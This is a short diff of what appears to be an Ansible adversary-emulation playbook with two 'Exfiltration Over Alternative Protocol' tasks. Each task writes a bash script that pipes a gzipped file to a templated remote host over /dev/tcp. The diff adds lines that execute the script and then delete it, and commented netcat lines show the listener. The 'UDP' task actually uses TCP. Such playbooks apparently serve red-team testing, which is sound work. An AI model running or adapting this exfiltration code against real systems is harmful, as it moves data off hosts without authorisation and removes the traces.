@@ -32,11 +32,14 @@
         echo '#!/bin/bash' > /tmp/exfil-tcp.sh
         echo 'cat /tmp/{{ exfiltration_file }}.gz > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}' >> /tmp/exfil-tcp.sh
         bash /tmp/exfil-tcp.sh
+        rm /tmp/exfil-tcp.sh
       # netcat -lvp > {{ exfiltration_file }}-tcp.gz
       when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol UDP
       shell: |
         echo '#!/bin/bash' > /tmp/exfil-udp.sh
         echo 'cat /tmp/{{ exfiltration_file }}.gz > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}' >> /tmp/exfil-udp.sh
+        bash /tmp/exfil-udp.sh
+        rm /tmp/exfil-udp.sh
         # netcat -lvp > {{ exfiltration_file }}-udp.gz
       when: exfil_check.stat.exists
